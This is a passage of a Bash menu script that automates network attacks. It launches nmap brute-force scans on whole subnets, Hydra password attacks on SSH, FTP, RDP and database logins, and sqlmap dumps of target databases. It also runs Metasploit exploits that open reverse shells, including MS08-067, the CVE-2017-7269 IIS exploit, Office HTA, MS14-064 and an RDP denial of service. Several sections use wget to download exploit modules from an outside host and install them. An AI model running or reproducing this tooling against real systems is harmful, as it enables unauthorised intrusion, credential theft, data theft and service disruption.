     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
echo -e  "     "
echo -e  "\033[1m \033[33m userdb > \c \033[0m"
     read userdb
     echo -e  "     "
echo -e  "\033[1m \033[33m passdb > \c \033[0m"
     read passdb
     nmap -p1433 --script=ms-sql-brute --script-args=userdb=$userdb,passdb=$passdb $lhost/24 -v   
                         echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc

     ;;
     30)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
    read lhost
    echo -e  "     "
    echo -e  "\033[1m \033[33m smbuser > \c \033[0m"
    read smbuser
    echo -e  "     "
    echo -e  "\033[1m \033[33m smbpass > \c \033[0m"
    read smbpass
    nmap -n -p445 --script=smb-enum-sessions.nse --script-args=smbuser=$smbuser,smbpass=$smbpass $lhost/24 -v   
                        echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     31)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
     read lhost
    echo -e  "     "
    echo -e  "\033[1m \033[33m smbuser > \c \033[0m"
    read smbuser
    echo -e  "     "
    echo -e  "\033[1m \033[33m smbpass > \c \033[0m"
    read smbpass
     nmap -n -p445 --script=smb-os-discovery.nse --script-args=smbuser=$smbuser,smbpass=$smbpass $lhost/24 -v
                         echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
     32)
echo -e  "     "
     echo -e  "\033[1m \033[33m lhost > \c \033[0m"
    read lhost
    echo -e  "     "
    echo -e  "\033[1m \033[33m userdb > \c \033[0m"
    read userdb
    echo -e  "     "
    echo -e  "\033[1m \033[33m passdb > \c \033[0m"
    read passdb
     nmap --script=smb-brute.nse --script-args=userdb=$userdb,passdb=$passdb $lhost/24 -v 
                         echo -e  "     "
     echo -e  "\033[1m \033[33m> Enter to continue Namp Scan < \c \033[0m"
     read ese1
     clasc
     ;;
33)
 meun
 ;;
 34)
 exit
 ;;
*)
clasc
esac
}

Metasploit(){
clear
echo -e "                                                  " 
echo -e "  ,           ,                                   " 
echo -e "   /             \                                "  
echo -e "  ((__---,,,---__))                               " 
echo -e "     (_) O O (_)_________                         " 
echo -e "                \ _ /     \                       " 
echo -e "         o_o \   M S F   | \                      " 
echo -e "              \   _____  |  *                     " 
echo -e "               |||   WW|||                        " 
echo -e "               |||     |||                        " 
echo -e "                                                  "
echo -e  "     \033[1m \033[36m                                      #Metasploit    \033[0m  "
echo -e "                                                  " 
echo -e  "\033[1m \033[33m [1]  Web_delivery \033[0m "
echo -e  "\033[1m \033[33m [2]  ShellCode  \033[0m"
echo -e  "\033[1m \033[33m [3]  Remote overflow  \033[0m"
echo -e  "\033[1m \033[33m [4]  Autopwn Scan   \033[0m    "
echo -e "                                                  " 
echo -e  "\033[1m \033[33m Serial number > \c \033[0m"
read acsse
    case $acsse in
     1)
     web_delivery
     ;;
     2)
Client
;;
4)
db_autopwn
;;
3)
overflow
;;
esac
}
web_delivery(){
clear
echo -e ""
echo -e  "\033[1m \033[33m #Metasploit                                       \033[0m"
echo -e  "\033[1m \033[33m                                                         \033[0m" 
echo -e  "\033[1m \033[33m #Web_delivery Manual  Script Web Delivery # Windows10 \033[0m"
echo "             "
echo -e  "\033[1m \033[33m [1]  PHP  \033[0m "
echo -e  "\033[1m \033[33m [2]  Python  \033[0m"
echo -e  " \033[1m \033[33m[3]  PSH  [PowerSploit.exe] \033[0m    "
echo -e  " \033[1m \033[33m[4]  back \033[0m    "
echo -e  " \033[1m \033[33m[5]  exit \033[0m    "
echo -e  "     "
echo -e  "\033[1m \033[33m Serial number > \c \033[0m"
read num2
    case $num2 in
        3)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
            echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
                echo -e "  "
            echo -e "  "
        echo -e "  +------------++------------------------------+"
echo -e "  | Name       ||         Show options         "
echo -e "  +------------++------------------------------"
echo -e "  | LHOST      || $lhost                       "
echo -e "  | LPORT      || $lport                       "
echo -e "  | target     || Windows [PSH]                       "
echo -e "  | Payload    || Windows/meterpreter/reverse_tcp  "
echo -e "  +------------++------------------------------+"
echo -e "  "
echo "use exploit/multi/script/web_delivery" >> msfwin10.rc
echo "set payload windows/meterpreter/reverse_tcp" >> msfwin10.rc
echo "set target 2" >> msfwin10.rc
echo "set lhost $lhost " >> msfwin10.rc
echo "set lport $lport" >> msfwin10.rc
echo "exploit" >> msfwin10.rc
msfconsole -r msfwin10.rc
rm -rf msfwin10.rc
            ;;
        2)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
echo -e "  "
echo -e "  "
echo -e "  +------------++------------------------------+"
echo -e "  | Name       ||         Show options         "
echo -e "  +------------++------------------------------"
echo -e "  | LHOST      || $lhost                       "
echo -e "  | LPORT      || $lport                       "
echo -e "  | target     || Python                       "
echo -e "  | Payload    || Python/meterpreter/reverse_tcp  "
echo -e "  +------------++------------------------------+"
echo -e "  "
echo "use exploit/multi/script/web_delivery" >> msfwin10.rc
echo "set payload python/meterpreter/reverse_tcp" >> msfwin10.rc
echo "set target 0" >> msfwin10.rc
echo "set lhost $lhost " >> msfwin10.rc
echo "set lport $lport" >> msfwin10.rc
echo "exploit" >> msfwin10.rc
msfconsole -r msfwin10.rc
rm -rf msfwin10.rc
            ;;
        1)
            echo -e  "     "
echo -e  "\033[1m \033[33m lhost > \c \033[0m "
        read lhost
            echo -e  "     "
echo -e  "\033[1m \033[33m lport > \c \033[0m "
        read lport
            echo -e "  "
            echo -e "  "
echo -e "  +------------++------------------------------+"
echo -e "  | Name       ||         Show options         "
echo -e "  +------------++------------------------------"
echo -e "  | LHOST      || $lhost                       "
echo -e "  | LPORT      || $lport                       "
echo -e "  | target     || PHP                       "
echo -e "  | Payload    || PHP/meterpreter/reverse_tcp  "
echo -e "  +------------++------------------------------+"
echo -e "  "
echo "use exploit/multi/script/web_delivery" >> msfwin10.rc
echo "set payload php/meterpreter/reverse_tcp" >> msfwin10.rc
echo "set target 1" >> msfwin10.rc 
echo "set lhost $lhost " >> msfwin10.rc
echo "set lport $lport" >> msfwin10.rc
echo "exploit" >> msfwin10.rc
msfconsole -r msfwin10.rc
rm -rf msfwin10.rc
;;
esac
}

db_autopwn(){
   echo -e  "     "
echo -e  "     "
echo -e  "\033[1m \033[33m                                                         \033[0m"
echo -e  "\033[1m \033[33m ##Metasploit                                       \033[0m"
echo -e  "\033[1m \033[33m                                                         \033[0m" 
echo -e  "\033[1m \033[33m #Automatic Overflow infiltration Intranet Host  \033[0m"
echo -e  "     \033[1m \033[36m \033[0m  "
echo -e  "     \033[1m \033[36m                                      #autopwn Scan   \033[0m  "
echo -e  "\033[1m \033[33m                                                        \033[0m"
echo -e  "\033[1m \033[33m Enter 1 Carry on 2 back > \c \033[0m "
read netss
case $netss in
    1)
echo -e  "     "
echo -e  "\033[1m \033[33m lhost> \c \033[0m "
read lhost
service postgresql start
echo "msfdb init  " >> msfshell.rc
wget www.w3bsafe.cn/137b5429d1c5a535/db_autopwn.rb.tar.gz
tar zxvf db_autopwn.rb.tar.gz
cp db_autopwn.rb /usr/share/metasploit-framework/plugins 
rm -rf db_autopwn.rb.tar.gz
rm -rf db_autopwn.rb
echo "db_nmap $lhost/24 -v " >> msfshell.rc
echo "load db_autopwn" >> msfshell.rc
echo "db_autopwn -t -p -r -e" >> msfshell.rc
msfconsole -r msfshell.rc
rm -rf msfshell.rc
;;
2)
Metasploit
;;
esac
}

sqlnet(){
clear
echo -e  "" 
echo -e  "                     __                                   " 
echo -e  "                   /  |                                  " 
echo -e  "  _______   ______  \$\$ | _____  ____    ______    ______  " 
echo -e  " /       | /      \ \$\$ |/     \/    \  /      \  /      \ " 
echo -e  "/\$\$\$\$\$\$\$/ /\$\$\$\$\$\$  |\$\$ |\$\$\$\$\$\$ \$\$\$\$  | \$\$\$\$\$\$  |/\$\$\$\$\$\$  |" 
echo -e  "\$\$      \ \$\$ |  \$\$ |\$\$ |\$\$ | \$\$ | \$\$ | /    \$\$ |\$\$ |  \$\$ |" 
echo -e  " \$\$\$\$\$\$  |\$\$ \__\$\$ |\$\$ |\$\$ | \$\$ | \$\$ |/\$\$\$\$\$\$\$ |\$\$ |__\$\$ |" 
echo -e  "/     \$\$/ \$\$    \$\$ |\$\$ |\$\$ | \$\$ | \$\$ |\$\$    \$\$ |\$\$    \$\$/ " 
echo -e  "\$\$\$\$\$\$\$/   \$\$\$\$\$\$\$ |\$\$/ \$\$/  \$\$/  \$\$/  \$\$\$\$\$\$\$/ \$\$\$\$\$\$\$/  " 
echo -e  "                \$\$ |                            \$\$ |      " 
echo -e  "                \$\$ |                            \$\$ |     "  
echo -e  "                \$\$/                             \$\$/      "
echo -e  ""   
echo -e  "     \033[1m \033[32m                          #SQLmap SQL injection \033[0m " 
echo -e  "     " 
    echo -e  "\033[1m \033[33m+-----------------------------+------------------------------+"
    echo -e  "\033[1m \033[33m| PHP ASPX JSP SQL injection  |   ASP SQL injection         \033[0m"
    echo -e  "\033[1m \033[33m+------------------------------+------------------------------+"
    echo -e  "\033[1m \033[33m| [1] --dbs                   |   [8]  --tables  "
    echo -e  "\033[1m \033[33m| [2] --current-db            |   [9]  --columns"
    echo -e  "\033[1m \033[33m| [3] --users                 |   [10] --dump  "
    echo -e  "\033[1m \033[33m| [4] --tables -D             |    "
    echo -e  "\033[1m \033[33m| [5] --columns -T  -D        |    "
    echo -e  "\033[1m \033[33m| [6] --current-user          |    "
    echo -e  "\033[1m \033[33m| [7] --dump                  |    "
    echo -e  "\033[1m \033[33m+-----------------------------+------------------------------+"
        echo -e  "     "
    echo -e  "\033[1m \033[33mSerial number > \c \033[0m" 
    read websql
       case $websql in
        1)
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL injection > \c \033[0m"
     read url
     sqlmap -u $url --db
     ;;
        2)
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL injection > \c \033[0m"
     read url
     sqlmap -u $url --current-db
     ;;        
     3)
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL injection > \c \033[0m"
     read url
     sqlmap -u $url --users
     ;;
          4)
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL injection > \c \033[0m"
     read url
     echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL Data > \c \033[0m"
    read data
     sqlmap -u $url --tables -D $data
     ;;
          5)
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL injection > \c \033[0m"
     read url
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL Tables > \c \033[0m"
    read table 
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL Data > \c \033[0m"
    read data
    sqlmap -u $url --columns -T $table -D $data
     ;;
     6)
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL injection > \c \033[0m"
     read url
     sqlmap -u $url --current-user
     ;;
          7)
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL injection > \c \033[0m"
     read url
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL Tables > \c \033[0m" 
    read table 
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL Columns > \c \033[0m" 
    read column
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL Data > \c \033[0m"
    read data

     sqlmap -u $url -D $data -T $table -C $column --dump
;;
8)
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL injection > \c \033[0m"
     read url
sqlmap -u $url --tables
;;
9)
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL injection > \c \033[0m"
     read url
    echo -e  "\033[1m \033[33mWeb SQL Table > \c \033[0m"
     read table
sqlmap -u $url -T $table --columns
;;
10)
    echo -e  "     "
    echo -e  "\033[1m \033[33mWeb SQL injection > \c \033[0m"
     read url
    echo -e  "\033[1m \033[33mWeb SQL Table > \c \033[0m"
     read table
    echo -e  "\033[1m \033[33mWeb SQL column > \c \033[0m"
     read column
sqlmap -u $url -T $table -C $column --dump
esac
}

WPScan(){
clear                                                      
echo -e  " __   __   __   ______    _______   _______   ______   _______  " 
echo -e  "/  | /  | /  | /      \  /       | /       | /      \ /       \ " 
echo -e  "\$\$ | \$\$ | \$\$ |/\$\$\$\$\$\$  |/\$\$\$\$\$\$\$/ /\$\$\$\$\$\$\$/  \$\$\$\$\$\$  |\$\$\$\$\$\$\$  |" 
echo -e  "\$\$ | \$\$ | \$\$ |\$\$ |  \$\$ |\$\$      \ \$\$ |       /    \$\$ |\$\$ |  \$\$ |" 
echo -e  "\$\$ \_\$\$ \_\$\$ |\$\$ |__\$\$ | \$\$\$\$\$\$  |\$\$ \_____ /\$\$\$\$\$\$\$ |\$\$ |  \$\$ |" 
echo -e  "\$\$   \$\$   \$\$/ \$\$    \$\$/ /     \$\$/ \$\$       |\$\$    \$\$ |\$\$ |  \$\$ |" 
echo -e  " \$\$\$\$\$/\$\$\$\$/  \$\$\$\$\$\$\$/  \$\$\$\$\$\$\$/   \$\$\$\$\$\$\$/  \$\$\$\$\$\$\$/ \$\$/   \$\$/ " 
echo -e  "              \$\$ |                                              " 
echo -e  "              \$\$ |                                              " 
echo -e  "              \$\$/                                               " 
echo -e  "     "
echo -e  "\033[1m \033[36m                                        ##WPScan WordPress Scan @ROOT \033[0m"
echo -e  "     "
echo -e  "\033[1m \033[33m [1]  Scan  \033[0m "
echo -e  "\033[1m \033[33m [2]  update  \033[0m "
echo -e  "\033[1m \033[33m [3]  help  \033[0m "
echo -e  "\033[1m \033[33m [4]  back  \033[0m"
echo -e  "\033[1m \033[33m [5]  exit   \033[0m    "
echo -e  ""
echo -e  "\033[1m \033[33m Serial number > \c \033[0m"
read wpscanq
    case $wpscanq in
        1)
echo -e  ""
        echo -e  "\033[1m \033[33m Web url > \c \033[0m"
        read url
        wpscan --url $url
        echo -e  ""
echo -e  "\033[1m \033[33m> Enter to continue WPScan Scan < \c \033[0m"
read wpscanq
     WPScan
        ;;
        3)
        wpscan --help
        echo -e  "\033[1m \033[33m> Enter to continue WPScan Scan < \c \033[0m"
read wpscanq
     WPScan
        ;;
        4)
        meun
        ;;
        5)
        exit
        ;;
        2)
wpscan --update
        echo -e  "\033[1m \033[33m> Enter to continue WPScan Scan < \c \033[0m"
read wpscanq
     WPScan
        ;;
        *)
        WPScan
        ;;
    esac
}

Hydra(){
    clear
    echo -e  "\033[1m \033[33m                                                         \033[0m"
    echo -e  "\033[1m \033[33m /\$\$                       /\$\$                            \033[0m" 
    echo -e  "\033[1m \033[33m| \$\$                      | \$\$                   \033[0m" 
    echo -e  "\033[1m \033[33m| \$\$\$\$\$\$\$  /\$\$   /\$\$  /\$\$\$\$\$\$\$  /\$\$\$\$\$\$  /\$\$\$\$\$\$ \033[0m" 
    echo -e  "\033[1m \033[33m| \$\$__  \$\$| \$\$  | \$\$ /\$\$__  \$\$ /\$\$__  \$\$|____  \$\$ \033[0m" 
    echo -e  "\033[1m \033[33m| \$\$  \ \$\$| \$\$  | \$\$| \$\$  | \$\$| \$\$  \__/ /\$\$\$\$\$\$\$ \033[0m" 
    echo -e  "\033[1m \033[33m| \$\$  | \$\$| \$\$  | \$\$| \$\$  | \$\$| \$\$      /\$\$__  \$\$ \033[0m"
    echo -e  "\033[1m \033[33m| \$\$  | \$\$|  \$\$\$\$\$\$\$|  \$\$\$\$\$\$\$| \$\$     |  \$\$\$\$\$\$\$ \033[0m" 
    echo -e  "\033[1m \033[33m|__/  |__/ \____  \$\$ \_______/|__/      \_______/ \033[0m" 
    echo -e  "\033[1m \033[33m           /\$\$  | \$\$                            \033[0m"  
    echo -e  "\033[1m \033[33m          |  \$\$\$\$\$\$/                           \033[0m"  
    echo -e  "\033[1m \033[33m           \______/    \033[0m" 
    echo -e  "\033[1m \033[33m          \033[0m" 
echo -e  "\033[1m \033[36m                               ##Hydra Blasting" 
    echo -e  " "
    echo -e "\033[1m \033[33m  [1]     Blasting SSH \033[0m"
    echo -e "\033[1m \033[33m  [2]     Blasting FTP \033[0m"
    echo -e "\033[1m \033[33m  [3]     Blasting Telnet \033[0m"
    echo -e "\033[1m \033[33m  [4]     Blasting Mysql \033[0m"
    echo -e "\033[1m \033[33m  [5]     Blasting Rdp 3389 \033[0m"
    echo -e "\033[1m \033[33m  [6]     Blasting Teamspeak \033[0m"
    echo -e "\033[1m \033[33m  [7]     Blasting Mssql \033[0m"
    echo -e "\033[1m \033[33m  [8]     Blasting https \033[0m"
    echo -e "\033[1m \033[33m  [9]     Blasting smb \033[0m"
    echo -e "\033[1m \033[33m  [10]    Back \033[0m"
    echo -e "\033[1m \033[33m  [11]    Exit\033[0m"   
    echo -e  " "
    echo -e  "\033[1m \033[33m Serial number > \c \033[0m"
read hydrass
       case $hydrass in
                    1)
    echo -e  " "
    echo -e  "\033[1m \033[33m lhost > \c \033[0m "
    read lhost
        echo -e  " "
    echo -e  "\033[1m \033[33m userpath > \c \033[0m "
    read userpath
        echo -e  " "
    echo -e  "\033[1m \033[33m passpath > \c \033[0m "
    read passpath
    hydra -L $userpath -P $passpath -t 1 -vV -e ns $lhost ssh
    ;;
    2)
echo -e  " "
    echo -e  "\033[1m \033[33m lhost > \c \033[0m "
    read lhost
        echo -e  " "
    echo -e  "\033[1m \033[33m userpath > \c \033[0m "
    read userpath
        echo -e  " "
    echo -e  "\033[1m \033[33m passpath > \c \033[0m "
    read passpath
        echo -e  " "
    echo -e  "\033[1m \033[33m Thread > \c \033[0m "
    read xc
    hydra $lhost ftp -L $userpath -P $passpath -t $xc -vV
;;
3)
echo -e  " "
    echo -e  "\033[1m \033[33m lhost > \c \033[0m "
    read lhost
        echo -e  " "
    echo -e  "\033[1m \033[33m userpath > \c \033[0m "
    read userpath
        echo -e  " "
    echo -e  "\033[1m \033[33m passpath > \c \033[0m "
    read passpath    
    hydra $lhost telnet -L $userpath -P $passpath -t 32 -s 23 -e ns -f -V 
    ;;
    4)
echo -e  " "
    echo -e  "\033[1m \033[33m lhost > \c \033[0m "
    read lhost
        echo -e  " "
    echo -e  "\033[1m \033[33m userpath > \c \033[0m "
    read userpath
        echo -e  " "
    echo -e  "\033[1m \033[33m passpath > \c \033[0m "
    read passpath
hydra -L $userpath -P $passpath -f -vV -e ns $lhost mysql
;;
5)
echo -e  " "
    echo -e  "\033[1m \033[33m lhost > \c \033[0m "
    read lhost
        echo -e  " "
    echo -e  "\033[1m \033[33m userpath > \c \033[0m "
        echo -e  " "
    read userpath
    echo -e  "\033[1m \033[33m passpath > \c \033[0m "
        echo -e  " "
    read passpath
    hydra $lhost rdp -L $userpath -P $passpath -V 
    ;;
    6)
echo -e  " "
    echo -e  "\033[1m \033[33m lhost > \c \033[0m "
    read lhost
    echo -e  " "
    echo -e  "\033[1m \033[33m lport > \c \033[0m "
    read lport
    echo -e  " "
    echo -e  "\033[1m \033[33m userpath > \c \033[0m "
    read userpath
    echo -e  " "
    echo -e  "\033[1m \033[33m passpath > \c \033[0m "
    read passpath
hydra -L $userpath -P $passpath -s $lport -vV ip teamspeak 
            ;;
            7)
echo -e  " "
    echo -e  "\033[1m \033[33m lhost > \c \033[0m "
    read lhost
    echo -e  " "
    echo -e  "\033[1m \033[33m userpath > \c \033[0m "
    read userpath
    echo -e  " "
    echo -e  "\033[1m \033[33m passpath > \c \033[0m "
    read passpath
hydra -L $userpath -P $passpath $lhost mssql -vv
;;
8)
echo -e  " "
    echo -e  "\033[1m \033[33m web url > \c \033[0m "
    read url
    echo -e  " "
    echo -e  "\033[1m \033[33m lhost > \c \033[0m "  
    read lhost 
    echo -e  "\033[1m \033[33m userpath > \c \033[0m "
    read userpath
    echo -e  " "
    echo -e  "\033[1m \033[33m passpath > \c \033[0m "
    read passpath
hydra -m $url -L $userpath -P $passpath $lhost https 
;;
9)
echo -e  " "
    echo -e  "\033[1m \033[33m lhost > \c \033[0m "  
    read lhost 
    echo -e  "\033[1m \033[33m userpath > \c \033[0m "
    read userpath
    echo -e  " "
    echo -e  "\033[1m \033[33m passpath > \c \033[0m "
    read passpath
hydra -L $userpath -P $passpath $lhost smb 
;;
10)
meun
;;
11)
exit
;;
esac
}
overflow()
{

                clear
                                echo -e  "     "
echo -e "                                                  " 
echo -e "  ,           ,                                   " 
echo -e "   /             \                                "  
echo -e "  ((__---,,,---__))                               " 
echo -e "     (_) O O (_)_________                         " 
echo -e "                \ _ /     \                       " 
echo -e "         o_o \   M S F   | \                      " 
echo -e "              \   _____  |  *                     " 
echo -e "               |||   WW|||                        " 
echo -e "               |||     |||                        " 
echo -e "                                                  "
echo -e "                              ##Remote overflow  "
echo -e  "     "
    echo -e  "\033[1m \033[33m+-----------------------------+"
    echo -e  "\033[1m \033[33m|  Remote overflow\033[0m"
    echo -e  "\033[1m \033[33m+-----------------------------+"
    echo -e  "\033[1m \033[33m| [1] Web IIS 6.0                "
    echo -e  "\033[1m \033[33m| [2] Microsoft Office           "
    echo -e  "\033[1m \033[33m| [3] browser_autopwn                    "
    echo -e  "\033[1m \033[33m| [4] MS08-067 #Windows                "
    echo -e  "\033[1m \033[33m| [5] MS12-020 #dos            "
    echo -e  "\033[1m \033[33m| [6] MS14-064 #Windows7            "
    echo -e  "\033[1m \033[33m| [7] MS14-064 #XP   "
    echo -e  "\033[1m \033[33m| [8] Back   "
    echo -e  "\033[1m \033[33m| [9] Exit   "
    echo -e  "\033[1m \033[33m+-----------------------------+"
        echo -e  "     "
    echo -e  "\033[1m \033[33mSerial number > \c \033[0m" 
read over
    case $over in
        1)
   echo -e  "     "
echo -e  "     "
echo -e  "\033[1m \033[33m                                                         \033[0m"
echo -e  "\033[1m \033[33m ##Metasploit                                       \033[0m"
echo -e  "\033[1m \033[33m                                                         \033[0m" 
echo -e  "\033[1m \033[36m #Web IIS 6.0 Remote overflow vulnerability  \033[0m"
echo -e  "     \033[1m \033[36m \033[0m  "
echo -e  "     \033[1m \033[36m                                      #Metasploit   \033[0m  "
echo -e  "\033[1m \033[33m                                                        \033[0m"
echo -e  "     "
echo -e  "\033[1m \033[33mlhost > \c \033[0m "
        read lhost
echo -e  "     "
echo -e  "\033[1m \033[33mrhost > \c \033[0m "
read rhost
echo -e  "     "
echo -e  "\033[1m \033[33mWeb url > \c \033[0m "
read url
service postgresql start
echo "msfdb init  " >> msfiis.rc
wget www.w3bsafe.cn/137b5429d1c5a535/cve-2017-7269.rb.tar.gz
tar zxvf cve-2017-7269.rb.tar.gz
mkdir /usr/share/metasploit-framework/modules/exploits/window/iis/iis6.0
cp -r cve-2017-7269.rb usr/share/metasploit-framework/modules/exploits/windows/iis/iis6.0
rm -rf cve-2017-7269.rb.tar.gz
rm -rf cve-2017-7269.rb
echo "use exploit/windows/iis/iis6.0/cve-2017-7269" >> msfiis.rc
echo "set payload windows/meterpreter/reverse_tcp" >> msfiis.rc
echo "set RHOST $rhost" >> msfiis.rc
echo "set HttpHost $url" >> msfiis.rc
echo "set lhost $lhost" >> msfiis.rc
echo "exploit" >> msfiis.rc
msfconsole -r msfiis.rc
rm -rf msfiis.rc
;;
2)
   echo -e  "     "
echo -e  "     "
echo -e  "\033[1m \033[33m                                                         \033[0m"
echo -e  "\033[1m \033[33m ##Metasploit                                       \033[0m"
echo -e  "\033[1m \033[33m                                                         \033[0m" 
echo -e  "\033[1m \033[36m #Microsoft Office  Remote overflow vulnerability  and hta_server \033[0m"
echo -e  "     \033[1m \033[36m \033[0m  "
echo -e  "     \033[1m \033[36m                                      #Metasploit   \033[0m  "
echo -e  "\033[1m \033[33m                                                        \033[0m"
echo -e  "     "
echo -e  "\033[1m \033[33mlhost > \c \033[0m "
        read lhost
echo -e  "     "
echo -e  "\033[1m \033[33mlport > \c \033[0m "
read lport
service postgresql start
echo "msfdb init  " >> msfword.rc
wget www.w3bsafe.cn/137b5429d1c5a535/office_word_hta.rb.tar.gz
tar zxvf office_word_hta.rb.tar.gz
cp -r office_word_hta.rb /usr/share/metasploit-framework/modules/exploits/windows/misc/
rm -rf office_word_hta.rb.tar.gz
rm -rf office_word_hta.rb
echo "use exploit/windows/misc/hta_server" >> msfhta_server.rc
echo "set payload windows/meterpreter/reverse_http" >> msfhta_server.rc
echo "set lport $lport" >> msfhta_server.rc
echo "set lhost $lhost" >> msfhta_server.rc
echo "exploit" >> msfhta_server.rc
msfconsole -r msfhta_server.rc
rm -rf msfhta_server.rc
echo -e  "     "
echo -e  "     "
echo -e  "\033[1m \033[33m                                                         \033[0m"
echo -e  "\033[1m \033[33m ##Metasploit                                       \033[0m"
echo -e  "\033[1m \033[33m                                                         \033[0m" 
echo -e  "\033[1m \033[36m #Microsoft Office  Remote overflow vulnerability  \033[0m"
echo -e  "     \033[1m \033[36m \033[0m  "
echo -e  "     \033[1m \033[36m                                      #Metasploit   \033[0m  "
echo -e  "\033[1m \033[33m                                                        \033[0m"
echo -e  "     "
echo -e  "\033[1m \033[33mlhost > \c \033[0m "
read lhost
echo -e  "     "
echo -e  "\033[1m \033[33mlport > \c \033[0m "
read lport
echo -e  "     "
echo -e  "\033[1m \033[33m name > \c \033[0m "
read name
echo -e  "     "
echo -e  "\033[1m \033[33m url > \c \033[0m "
read url
echo "use exploit/windows/misc/office_word_hta" >> msfword.rc
echo "set FILENAME $name" >> msfword.rc
echo "set TARGETURI $url" >> msfword.rc
echo "set lhost $lhost" >> msfword.rc
echo "exploit" >> msfword.rc
msfconsole -r msfword.rc
rm -rf msfword.rc
;;
3)
echo -e  "     "
echo -e  "\033[1m \033[33mlhost > \c \033[0m "
        read ip
            echo -e  "     "
echo -e  "\033[1m \033[33murlpath > \c \033[0m "
        read urlpath
            echo -e "  "
            echo -e "  "
echo -e "  +------------++------------------------------+"
echo -e "  | Name       ||         Show options         "
echo -e "  +------------++------------------------------"
echo -e "  | LHOST      || $ip                       "
echo -e "  | URIPATH    || $urlpath                       "
echo -e "  +------------++------------------------------+"
echo -e "  "
echo "use auxiliary/server/browser_autopwn" >> browser.rc
echo "set lhost $ip" >> browser.rc
echo "set URIPATH $urlpath" >> browser.rc
echo "exploit" >> browser.rc
msfconsole -r browser.rc
rm -rf browser.rc
;;
4)
echo -e  "     "
echo -e  "\033[1m \033[33mlhost > \c \033[0m "
        read ip
            echo -e  "     "
            echo -e "  "
echo -e "  +------------++------------------------------+"
echo -e "  | Name       ||         Show options         "
echo -e "  +------------++------------------------------"
echo -e "  | RHOST      || $ip                       "
echo -e "  | RPORT      || 445                       "
echo -e "  +------------++------------------------------+"
echo -e "  "
echo "use exploit/windows/smb/ms08_067_netapi" >> ms08_067.rc
echo "set RHOST $ip" >> ms08_067.rc
echo "exploit" >> ms08_067.rc
msfconsole -r ms08_067.rc
rm -rf ms08_067.rc
;;
5)
echo -e  "     "
echo -e  "\033[1m \033[33mlhost > \c \033[0m "
        read ip
            echo -e  "     "
            echo -e "  "
echo -e "  +------------++------------------------------+"
echo -e "  | Name       ||         Show options         "
echo -e "  +------------++------------------------------"
echo -e "  | RHOST      || $ip                       "
echo -e "  | RPORT      || 3389                       "
echo -e "  +------------++------------------------------+"
echo -e "  "
echo "use auxiliary/dos/windows/rdp/ms12_020_maxchannelids" >> ms12_020.rc
echo "set RHOST $ip" >> ms12_020.rc
echo "exploit" >> ms12_020.rc
msfconsole -r ms12_020.rc
rm -rf ms12_020.rc
;;
6)
echo -e  "     "
echo -e  "\033[1m \033[33mlhost > \c \033[0m "
        read ip
            echo -e  "     "
echo -e  "\033[1m \033[33murlpath > \c \033[0m "
        read urlpath
            echo -e "  "
            echo -e "  "
echo -e "  +------------++------------------------------+"
echo -e "  | Name       ||         Show options         "
echo -e "  +------------++------------------------------"
echo -e "  | LHOST      || $ip                       "
echo -e "  | URIPATH    || $urlpath                       "
echo -e "  +------------++------------------------------+"
echo -e "  "
echo "use exploit/windows/browser/ms14_064_ole_code_execution" >> ms14_064#win7.rc
echo "set payload windows/meterpreter/reverse_tcp" >> ms14_064#win7.rc
echo "set target 1" >> ms14_064#win7.rc
echo "set lhost $ip" >> ms14_064#win7.rc
echo "set URIPATH $urlpath" >> ms14_064#win7.rc
echo "exploit" >> ms14_064#win7.rc
msfconsole -r ms14_064#win7.rc
rm -rf ms14_064#win7.rc
;;
7)
echo -e  "     "
echo -e  "\033[1m \033[33mlhost > \c \033[0m "
        read ip
            echo -e  "     "
echo -e  "\033[1m \033[33murlpath > \c \033[0m "
        read urlpath
            echo -e "  "
            echo -e "  "
echo -e " +------------++------------------------------+"
echo -e " | Name       ||         Show options         "
echo -e " +------------++------------------------------"
echo -e " | LHOST      || $ip        "
echo -e " | URIPATH    || $urlpath   "
echo -e " +------------++------------------------------+"
echo -e "  "
echo "use exploit/windows/browser/ms14_064_ole_code_execution" >> ms14_064#xp.rc
echo "set payload windows/meterpreter/reverse_tcp" >> ms14_064#xp.rc
echo "set target 0" >> ms14_064#xp.rc
echo "set lhost $ip" >> ms14_064#xp.rc
echo "set URIPATH $urlpath" >> ms14_064#xp.rc
echo "exploit" >> ms14_064#xp.rc
msfconsole -r ms14_064#xp.rc
rm -rf ms14_064#xp.rc
;;
8)
Metasploit
;;
9)
exit
;;
esac
}
meun
